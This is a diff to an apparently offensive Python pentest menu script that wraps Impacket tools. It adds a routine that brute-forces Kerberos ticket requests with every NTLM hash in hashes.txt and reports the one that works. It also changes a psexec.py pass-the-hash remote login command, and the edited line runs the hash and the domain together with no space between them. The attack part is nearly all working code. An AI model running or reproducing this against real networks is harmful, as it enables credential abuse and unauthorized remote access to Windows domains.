@@ -1971,33 +1971,64 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '46':
-      CheckParams = 0
+      checkParams = 0
+      
+      if TIP[:5] == "EMPTY":
+         print("[-] Remote IP address has not been specified...")
+         checkParams = 1
 
       if DOM[:5] == "EMPTY":
          print("[-] Domain name has not been specified...")
-         CheckParams = 1
+         checkParams = 1
 
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         CheckParams = 1
+      if checkParams != 1:
+         print("[*] Attempting to generate ticket for user " + USR.rstrip(" ") + "...")
 
-      if CheckParams != 1:
-         print("[*] Trying user " + USR.rstrip(" ") + "...\n")
-
-         if PAS[:1] != "\"":
-            command(keypath + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
-            command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
-         else:
-            if NTM[:1] != "":
-               command(keypath + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + NTM)
+         if NTM[:1] != "":
+            print("[+] Using current associated hash...")
+            command(keypath + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " -dc-ip " + TIP.rstrip(" ") + " > log.tmp")
+            
+            command("sed -i '1d' log.tmp")
+            command("sed -i '1d' log.tmp")            
+            
+            checkFile = linecache.getline('log.tmp', 1)
+            
+            if "[*] Saving ticket" in checkFile:
+               print("[+] Saving ticket in " + USR.rstrip(" ") + ".ccache")
                command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
+               checkParams = 1
             else:
-               print("[-] User password or hash required...")
+               print("[-] Current associated hash is not valid...")
+           
+         if checkParams != 1:
+            count = len(open('hashes.txt').readlines())
+            if count > 0:
+               print("[*] Please wait, bruteforcing using " + str(count) + " found hashes...")
 
-         if os.path.exists(USR.rstrip(" ") + ".ccache"):
-            command(keypath + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
-         else:
-             print("[-] TGT was not generated...")
+               with open("hashes.txt", "r") as read:
+                  for line in read:
+                     line = line.rstrip("\n")
+                     command(keypath + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + line.rstrip(" ") + " -dc-ip " + TIP.rstrip(" ") + " > log2.tmp")
+
+                     command("sed -i '1d' log2.tmp")
+                     command("sed -i '1d' log2.tmp")
+                        
+                     linecache.clearcache()
+                     checkFile2 = linecache.getline('log2.tmp', 1)
+                                               
+                     if "[*] Saving ticket in " in checkFile2:
+                        print("[+] Saving ticket in " + USR.rstrip(" ") + ".ccache")
+                        print("[i] A valid hash for " + USR.rstrip(" ") + " is " + line + "...")                          
+                        command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
+                        checkParams = 2
+                        break
+                                                      
+                     if "Clock skew too great" in checkFile2:
+                        print("[-] Clock skew too great, terminating...")
+                        checkParams = 2
+                        break
+               if checkParams != 2:
+                  print("[-] Hashes.txt exhausted...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2307,7 +2338,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH.
+# Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH - -service-name LUALL.exe"
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -2324,7 +2355,7 @@ while True:
 
       if CheckParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n")
-         command(keypath + "psexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -service-name LUALL.exe") 
+         command(keypath + "psexec.py -hashes :" + NTM.rstrip("\n") + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -no-pass")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
